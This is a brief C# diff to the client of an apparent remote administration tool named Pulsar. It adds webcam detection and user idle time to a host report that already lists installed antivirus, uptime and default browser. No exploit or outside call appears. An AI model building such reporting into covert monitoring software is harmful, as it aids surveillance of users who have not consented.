@@ -1,17 +1,19 @@
 ﻿using Pulsar.Client.Helper;
+using Pulsar.Client.IO;
+using Pulsar.Client.User;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Other;
+using Pulsar.Common.Messages.Preview;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video;
 using Pulsar.Common.Video.Codecs;
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Diagnostics;
-using Pulsar.Common.Messages.Preview;
-using Pulsar.Common.Messages.Other;
-using Pulsar.Client.IO;
+using System.Linq;
 
 namespace Pulsar.Client.Messages
 {
@@ -114,9 +116,11 @@ namespace Pulsar.Client.Messages
                         RAM = HardwareDevices.TotalPhysicalMemory.ToString(),
                         Uptime = SystemHelper.GetUptime(),
                         AV = SystemHelper.GetAntivirus(),
-                        MainBrowser = SystemHelper.GetDefaultBrowser()
+                        MainBrowser = SystemHelper.GetDefaultBrowser(),
+                        HasWebcam = (WebcamHelper.GetWebcams()?.Length > 0),
+                        AFKTime = ActivityDetection.UserIdleTime().ToString()
                     });
-
+                    
                     _streamCodec = null;
                 }
             }
